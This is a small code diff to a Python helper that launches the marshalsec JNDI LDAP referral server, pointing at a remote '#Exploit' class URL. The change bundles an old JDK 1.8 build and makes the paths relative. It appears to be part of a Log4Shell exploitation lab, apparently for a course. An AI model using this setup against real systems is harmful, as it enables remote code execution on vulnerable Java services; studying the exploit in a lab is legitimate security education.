@@ -96,12 +96,13 @@ def ldap_server(userip: str, lport: int) -> None:
 
     url = "http://{}:{}/#Exploit".format(userip, lport)
     subprocess.run([
-        "java",
+        os.path.join(CUR_FOLDER, "jdk1.8.0_181/bin/java"),
         "-cp",
-        "/mnt/c/Users/Hcoli/ece455-log4j/marshalsec-0.0.3-SNAPSHOT-all.jar",
+        os.path.join(CUR_FOLDER, "marshalsec-0.0.3-SNAPSHOT-all.jar"),
         "marshalsec.jndi.LDAPRefServer",
-        "http://{}:{}/#Exploit".format(userip, lport)
-    ], cwd=CUR_FOLDER)
+        url,
+    ])
+
 
 
 
